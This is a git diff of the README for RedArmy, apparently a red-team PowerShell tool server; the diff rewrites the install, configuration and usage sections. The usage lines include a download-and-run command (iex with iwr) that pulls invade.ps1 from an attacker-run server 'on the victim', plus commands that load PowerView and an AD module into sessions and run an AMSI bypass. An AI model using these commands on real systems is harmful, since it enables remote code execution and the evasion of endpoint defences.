@@ -6,31 +6,44 @@
 $ git clone https://gitlab.com/mjwhitta/redarmy.git
 $ cd ./redarmy
 $ git submodule update --init --recursive
-$ ./serve [--port PORT] [--update] <ip>
+$ git submodule foreach git checkout master # optional
+$ git submodule foreach git pull # optional
 ```
 
+## Configuration
+
+RedArmy uses `config.default` by default. You can copy it to `config`
+and delete or add lines as necessary.
+
 ## Usage
+
+```
+$ ./serve [--port PORT] [--update] <ip>
+```
 
 Once the `serve` script is running, you can use the following to load
 RedArmy on the victim:
 
-```
-PS> iex (iwr -DisableKeepAlive -UseBasicParsing http://<ip>:<port>/invade.ps1)
-```
+- `iex (iwr -DisableKeepAlive -UseBasicParsing
+  http://<ip>:<port>/invade.ps1)`
 
 That command will also displayed for you to copy and paste for
-convenience. Finally, you can deploy tools with commands like:
+convenience.
 
-```
-PS> iex (Get-PowerView) # Load ps1 script into current session
-PS> Deploy-PowerView <session> # Load ps1 script into session
+### Examples
 
-PS> Import-ADModuleDLL # Load DLL object into current session
-PS> Deploy-ADModuleDLL <session> # Load DLL object into session
+- Load ps1 script into current session
+    - `iex (Get-PowerView)`
+- Load ps1 script into session
+    - `Deploy-PowerView <session>`
+- Load DLL object into current session
+    - `Import-ADModuleDLL`
+- Load DLL object into session
+    - `Deploy-ADModuleDLL <session>`
+- Run ps1 script
+    - `Invoke-AMSIBypass`
+- Run ps1 script in session
+    - `Deploy-AMSIBypass <session>`
 
-PS> Invoke-AMSIBypass # Run ps1 script
-PS> Deploy-AMSIBypass <session> # Run ps1 script in session
-```
-
-**Note:*** `Invoke` commands are generally for things that aren't
+**Note:** `Invoke` commands are generally for things that aren't
 scope specific such as modifying system settings.
